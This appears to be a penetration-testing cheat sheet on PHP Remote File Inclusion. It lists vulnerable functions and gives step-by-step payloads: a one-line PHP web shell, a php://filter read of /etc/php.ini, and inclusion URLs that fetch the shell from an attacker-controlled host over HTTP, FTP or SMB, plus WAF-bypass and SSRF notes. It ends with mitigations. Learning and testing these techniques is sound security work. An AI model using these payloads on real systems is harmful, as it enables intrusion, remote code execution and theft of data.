# Remote File Inclusion (RFI)

### RFI vs LFI

* **RFI:** Includes remote resources; allows remote code execution and SSRF.
* **LFI:** Includes local files only.
* RFI usually implies LFI, but LFI does not imply RFI.

### Vulnerable Functions

Common PHP functions susceptible to RFI when user input is not sanitized:

* `include()`
* `include_once()`
* `require()`
* `require_once()`
* `file_get_contents()`
* `fopen()`
* `readfile()`

Any function that retrieves or executes file content can be vulnerable.

---

## Verifying RFI

### 1. Check PHP Configuration

* RFI requires `allow_url_include = On`
* `allow_url_fopen` may enable some behavior even if `allow_url_include` is off.

Extract via LFI + filter:

```
php://filter/convert.base64-encode/resource=/etc/php.ini
```

### 2. Test With a Local URL

Always test with localhost first:

```
?page=http://127.0.0.1/test.txt
```

### 3. Check for Execution vs Display

Determine if PHP executes the remote file or displays it as text:

```
# Hosted file contains:
<?php system($_GET["cmd"]); ?>

?page=http://attacker/script.php&cmd=id
```

---

## Remote Code Execution (RCE)

### Steps

1. Host a malicious PHP script (web shell):

```php
<?php system($_GET['cmd']); ?>
```

2. Start a host server:

```
python3 -m http.server 8000
```

3. Trigger inclusion:

```
?page=http://YOUR_IP:8000/shell.php&cmd=whoami
```

---

## Hosting Methods

### HTTP (most common)

```
python3 -m http.server 8000
```

### FTP (useful when HTTP blocked)

```
python3 -m pyftpdlib -p 21
```

Include using authentication:

```
?page=ftp://user:pass@YOUR_IP/shell.php
```

### SMB (Windows targets / internal networks)

```
smbserver.py share .
```

Include via UNC path:

```
?page=\\YOUR_IP\share\shell.php
```

---

## Additional Considerations

### Security Risks

* RFI is one of the most severe web vulnerabilities.
* Allows **full system compromise**, SSRF, network pivoting.

### WAF Bypass Techniques

* Double encoding
* URL obfuscation
* Using alternate protocols (FTP, SMB)
* Using short/long URL representations

### SSRF Through RFI

* RFI can be used to:
  * query internal services
  * read metadata endpoints (e.g., AWS)
  * access internal admin panels


### Mitigation
* Validate and sanitize all user input.
* Disable `allow_url_include`.
* Restrict outbound network access from web servers.
* Use allowlists for included files.
* Keep PHP and extensions updated.
